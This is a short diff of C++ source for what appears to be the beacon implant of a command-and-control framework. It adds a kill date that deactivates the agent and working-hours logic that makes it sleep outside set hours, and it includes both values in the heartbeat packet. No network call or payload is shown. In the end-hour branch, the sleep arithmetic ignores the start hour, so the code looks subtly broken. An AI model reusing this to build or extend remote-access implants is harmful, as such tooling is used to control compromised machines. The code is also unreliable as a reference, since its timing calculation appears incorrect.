@@ -44,7 +44,42 @@ void Agent::SetActive(BOOL state)
 
 BOOL Agent::IsActive()
 {
-	return this->config->active;
+	ULONG now = GetSystemTimeAsUnixTimestamp();
+	return this->config->active && !(this->config->kill_date && now >= this->config->kill_date);
+}
+
+ULONG Agent::GetWorkingSleep() 
+{
+    if ( !this->config->working_time )
+        return 0;
+
+    WORD endM   = (this->config->working_time >> 0) % 64;
+    WORD endH   = (this->config->working_time >> 8) % 64;
+    WORD startM = (this->config->working_time >> 16) % 64;
+    WORD startH = (this->config->working_time >> 24) % 64;
+
+	ULONG newSleepTime = 0;
+	SYSTEMTIME SystemTime = { 0 };
+    ApiWin->GetLocalTime(&SystemTime);
+
+    if (SystemTime.wHour < startH) {
+        newSleepTime = (startH - SystemTime.wHour) * 60 + (startM - SystemTime.wMinute);
+    }
+    else if (endH < SystemTime.wHour) {
+        newSleepTime = (24 - SystemTime.wHour - 1) * 60 + (60 - SystemTime.wMinute);
+        newSleepTime += startH * 60 + startM;
+    }
+    else if (SystemTime.wHour == startH && SystemTime.wMinute < startM) {
+        newSleepTime = startM - SystemTime.wMinute;
+    }
+    else if (SystemTime.wHour == endH && endM <= SystemTime.wMinute) {
+        newSleepTime = 23 * 60 + (60 + startM - SystemTime.wMinute);
+    }
+    else {
+        return 0;
+    }
+
+    return newSleepTime * 60 - SystemTime.wSecond;
 }
 
 BYTE* Agent::BuildBeat(ULONG* size)
@@ -65,6 +100,8 @@ BYTE* Agent::BuildBeat(ULONG* size)
 	packer->Pack32(this->info->agent_id);
 	packer->Pack32(this->config->sleep_delay);
 	packer->Pack32(this->config->jitter_delay);
+	packer->Pack32(this->config->kill_date);
+	packer->Pack32(this->config->working_time);
 	packer->Pack16(this->info->acp);
 	packer->Pack16(this->info->oemcp);
 	packer->Pack8(this->info->gmt_offest);
